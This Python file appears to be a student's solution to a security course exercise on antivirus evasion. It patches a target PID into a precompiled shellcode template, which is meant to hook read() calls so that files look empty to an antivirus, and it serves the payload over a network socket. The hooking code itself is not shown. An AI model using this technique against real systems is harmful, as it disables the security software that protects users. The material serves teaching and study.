import evasion
import struct

class SolutionServer(evasion.EvadeAntivirusServer):

    def get_payload(self, pid: int) -> bytes:
        """Returns a payload to intercept all calls to read.

        Reminder: We want to intercept all calls to read (for all files)
        and replace them with calls that read a length of 0 bytes (to make
        the files appear empty).

        Notes:
        1. You can assume we already compiled q4.c into q4.template.

        Returns:
             The bytes of the payload.
        """
        PATH_TO_TEMPLATE = './q4.template'
        template_file = open(PATH_TO_TEMPLATE, "rb") # open to read in binary mode
        template = template_file.read()
        template_file.close()

        pid_loc = template.find(struct.pack("<I", 0x01234567))

        shellcode = template[:pid_loc] + struct.pack("<I", pid) + template[pid_loc+4:]

        return shellcode

    def print_handler(self, product: bytes):
        # WARNING: DON'T EDIT THIS FUNCTION!
        print(product.decode('latin-1'))

    def evade_antivirus(self, pid: int):
        # WARNING: DON'T EDIT THIS FUNCTION!
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)
